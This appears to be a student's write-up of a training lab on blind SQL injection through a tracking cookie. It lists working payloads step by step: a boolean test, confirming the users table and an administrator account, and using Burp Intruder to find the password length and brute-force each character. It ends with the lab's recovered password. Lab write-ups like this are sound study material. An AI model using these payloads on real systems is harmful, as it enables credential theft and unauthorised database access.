Lab 11 - Blind SQL injection with conditional responses

1) Confirm that the parameter is vulnerable to blind SQLi
testing for response with welcome back massage
by payload

TrackingId=1k2UOfwhpyOj77BA' and 1=1--

the massgae come back that means that the parameter is vulnerable to blind SQLi

3) Confirm that we have a users table
using payload
trackingId = '1k2UOfwhpyOj77BA' and (select 'x' from users LIMIT 1)='x'--'

the massgae come back that means that the users table is in database

5) Confirm that username administrator exists users table
using payload
' and (select username from users where username='administrator')='administrator'--'

the massgae come back that means that the users administrator is in database

7) knowing  the password length of the administrator user
using payload with burp intruder to bruteforce the length of password
' and (select username from users where username='administrator' and LENGTH(password)>19)='administrator'--'

i found password is 20 characters

8) brute force the password
using burp intruder to brute force the characters
with two payloads one on the character index and one on every character to guess it
and filter for welcome word
' and (select substring(password,2,1) from users where username='administrator')='a'--'

![image](https://github.com/user-attachments/assets/5bb4a248-13f5-4a95-bb7b-98df308d0478)
the password is
r3s1k6jwbwn9qu94h4qm

